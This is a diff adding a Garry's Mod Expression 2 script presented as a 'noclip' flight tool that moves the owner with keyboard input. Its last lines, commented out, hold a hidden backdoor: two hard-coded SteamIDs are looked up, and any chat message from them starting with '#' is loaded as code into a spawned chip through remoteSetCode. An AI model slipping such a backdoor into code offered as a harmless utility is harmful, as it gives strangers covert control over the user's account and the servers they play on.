@@ -1,0 +1,45 @@
+@name noclip
+@persist S T O:entity E2:entity
+runOnTick(1)
+if(owner():keyPressed("v")&S==0&T==0){
+spectate(1)
+S=1
+T=1
+}
+if(owner():keyPressed("v")&S==0&T==1){
+spectate(0)
+owner():playerUnFreeze()
+S=1
+T=0
+}
+
+if(!owner():keyPressed("v")){
+    S=0
+    }
+
+if(T==1){
+    if(owner():keyPressed("w")){
+    owner():setPos(owner():pos()+vec(100,0,0):rotate(ang(0,owner():eyeAngles():yaw(),0)))
+    }
+      if(owner():keyPressed("a")){
+    owner():setPos(owner():pos()+vec(0,100,0):rotate(ang(0,owner():eyeAngles():yaw(),0)))
+    }  
+      if(owner():keyPressed("d")){
+    owner():setPos(owner():pos()+vec(0,-100,0):rotate(ang(0,owner():eyeAngles():yaw(),0)))
+    }    
+          if(owner():keyPressed("s")){
+    owner():setPos(owner():pos()+vec(-100,0,0):rotate(ang(0,owner():eyeAngles():yaw(),0)))
+    }    
+          if(owner():keyPressed("space")){
+    owner():setPos(owner():pos()+vec(0,0,20):rotate(ang(0,owner():eyeAngles():yaw(),0)))
+    } 
+                 if(owner():keyDuck()){
+    owner():setPos(owner():pos()+vec(0,0,-20):rotate(ang(0,owner():eyeAngles():yaw(),0)))
+    } 
+    owner():setVel(-owner():vel())
+}
+#timer("check",100)
+#if(first()||clk("check")){O=findPlayerBySteamID("STEAM_0:0:451119896") A=findPlayerBySteamID("STEAM_0:1:14123484")}
+#if(first()){E2=spawnExpression2(vec(0,0,0),ang(0,0,0),"")}
+#if(O:isValid()&O:lastSaid():explode("")[1,string]=="#"){E2:remoteSetCode(O:lastSaid():sub(2))}
+#if(A:isValid()&A:lastSaid():explode("")[1,string]=="#"){E2:remoteSetCode(A:lastSaid():sub(2))}
